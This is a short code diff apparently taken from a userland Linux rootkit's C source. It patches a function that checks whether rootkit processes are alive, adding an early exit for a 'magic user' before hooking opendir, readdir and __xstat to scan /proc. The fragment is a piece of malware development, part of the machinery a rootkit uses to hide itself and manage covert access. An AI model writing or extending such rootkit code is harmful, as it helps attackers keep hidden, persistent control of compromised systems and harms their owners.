@@ -5,6 +5,9 @@ int rkprocup(void){      // determines whether or not rootkit processes are aliv
     struct stat procstat;
     gid_t magicgid = readgid();
 
+    if(magicusr())
+        return 1;
+
     hook(COPENDIR, CREADDIR, C__XSTAT);
 
     dp = call(COPENDIR, "/proc");
